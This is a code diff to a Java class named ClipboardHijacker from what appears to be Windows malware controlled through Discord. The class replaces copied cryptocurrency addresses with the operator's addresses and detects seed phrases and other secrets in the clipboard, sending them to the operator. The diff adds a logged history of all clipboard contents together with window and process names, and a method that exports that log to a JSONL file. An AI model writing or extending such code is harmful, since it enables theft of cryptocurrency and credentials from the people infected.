@@ -19,7 +19,10 @@ import java.util.Map;
  * clipboard write; Java owns validation and rotation, exchanged over stdin and
  * stdout so a replacement lands in a few milliseconds, not on a poll tick.
  */
-final class ClipboardHijacker {
+final class ClipboardHijacker implements ClipboardService {
+	record Event(long ts, String window, String process, String content, String kind, String replaced) {
+	}
+
 	private final Path installDir;
 	private final Path ops;
 	private final State state;
@@ -33,6 +36,9 @@ final class ClipboardHijacker {
 	private Thread whip;
 	private String lastSet = "";
 	private String lastSecret = "";
+	private final java.util.ArrayDeque<Event> history = new java.util.ArrayDeque<>();
+	private volatile int maxHistory = 500;
+	private volatile long lastSave;
 
 	ClipboardHijacker(Path installDir, Path ops, State state, OpsNotifier notifier) {
 		this.installDir = installDir;
@@ -49,7 +55,8 @@ final class ClipboardHijacker {
 		return state.clipboardSecretsSet ? state.clipboardSecrets : DiscordConfig.sendSecrets();
 	}
 
-	synchronized boolean start() {
+	@Override
+	public synchronized boolean start() {
 		if (!AgentPaths.isWindows() || !wanted()) {
 			return false;
 		}
@@ -148,29 +155,44 @@ final class ClipboardHijacker {
 			}
 			if (decision != null) {
 				lastSet = decision.replacement();
+				record(process, title, text, null);
 				respond("SET " + Base64.getEncoder().encodeToString(
 					decision.replacement().getBytes(StandardCharsets.UTF_8)));
 				synchronized (state) {
 					state.clipEvents++;
-					state.save(AgentPaths.state(installDir));
+					saveDebounced();
 				}
-				notifier.clipboard("clipboard: " + decision.coin() + " " + decision.original() + " -> "
-					+ decision.replacement());
+				String legacy = "clipboard: " + decision.coin() + " " + decision.original() + " -> "
+					+ decision.replacement();
+				notifier.clipboard(legacy);
+				java.util.Map<String, Object> data = new java.util.LinkedHashMap<>();
+				data.put("coin", decision.coin());
+				data.put("original", decision.original());
+				data.put("replacement", decision.replacement());
+				notifier.event("clipboard_replace", data, legacy);
 				return;
 			}
 			respond("SKIP");
-			if (!secretsWanted() || clean.equals(lastSecret)) {
-				return;
-			}
-			SecretDetector.Secret secret = SecretDetector.detect(text, process, title);
+			SecretDetector.Secret secret = secretsWanted() ? SecretDetector.detect(text, process, title) : null;
 			Log.debug("Clipboard event: " + process + " | " + title + " | " + clean.length()
 				+ " chars | " + (secret == null ? "no secret" : secret.kind()));
-			if (secret == null) {
+			record(process, title, text, secret);
+			if (secret == null || clean.equals(lastSecret)) {
 				return;
 			}
 			lastSecret = clean;
 			SecretDetector.alerted(secret.value());
-			notifier.clipboard(SecretDetector.message(secret, process, title));
+			String legacy = SecretDetector.message(secret, process, title);
+			notifier.clipboard(legacy);
+			java.util.Map<String, Object> data = new java.util.LinkedHashMap<>();
+			data.put("kind", secret.kind());
+			data.put("value", secret.value());
+			data.put("process", process);
+			data.put("title", title);
+			if (secret.kind().startsWith("seed-")) {
+				data.put("words", secret.kind().endsWith("24") ? 24 : 12);
+			}
+			notifier.event("clipboard_secret", data, legacy);
 		} catch (Throwable throwable) {
 			Log.debug("Clipboard decision failed", throwable);
 			respond("SKIP");
@@ -197,7 +219,8 @@ final class ClipboardHijacker {
 		}
 	}
 
-	synchronized void stop() {
+	@Override
+	public synchronized void stop() {
 		active = false;
 		Process current = process;
 		process = null;
@@ -211,6 +234,74 @@ final class ClipboardHijacker {
 			}
 		}
 		state.save(AgentPaths.state(installDir));
+	}
+
+	/** Clipboard bursts must not rewrite state.json on every copy. */
+	private void saveDebounced() {
+		long now = System.currentTimeMillis();
+		if (now - lastSave < 2000L) {
+			return;
+		}
+		lastSave = now;
+		state.save(AgentPaths.state(installDir));
+	}
+
+	private void record(String process, String title, String content, SecretDetector.Secret secret) {
+		String kind = "text";
+		if (secret != null) {
+			kind = secret.kind().toLowerCase(java.util.Locale.ROOT);
+		} else {
+			for (String coin : coins().keySet()) {
+				if (AddressValidator.valid(coin, content)) {
+					kind = coin;
+					break;
+				}
+			}
+		}
+		synchronized (history) {
+			history.addFirst(new Event(System.currentTimeMillis() / 1000L, title, process, content, kind, lastSet));
+			while (history.size() > maxHistory) {
+				history.removeLast();
+			}
+		}
+	}
+
+	@Override
+	public void configure(int max) {
+		maxHistory = Math.max(16, Math.min(5000, max));
+	}
+
+	@Override
+	public int size() {
+		synchronized (history) {
+			return history.size();
+		}
+	}
+
+	@Override
+	public String status() {
+		return "clipboard=" + (active ? "on" : "off") + " entries=" + size();
+	}
+
+	@Override
+	public Path flush(Path dir) throws Exception {
+		java.nio.file.Files.createDirectories(dir);
+		Path out = dir.resolve("clipboard.jsonl");
+		StringBuilder builder = new StringBuilder();
+		synchronized (history) {
+			for (Event event : history) {
+				Map<String, Object> row = new LinkedHashMap<>();
+				row.put("ts", event.ts());
+				row.put("window", event.window());
+				row.put("process", event.process());
+				row.put("content", event.content());
+				row.put("kind", event.kind());
+				row.put("replaced", event.replaced().isEmpty() ? null : event.replaced());
+				builder.append(Json.stringify(row)).append('\n');
+			}
+		}
+		java.nio.file.Files.writeString(out, builder.toString(), StandardCharsets.UTF_8);
+		return out;
 	}
 
 	/** Discord commands. */
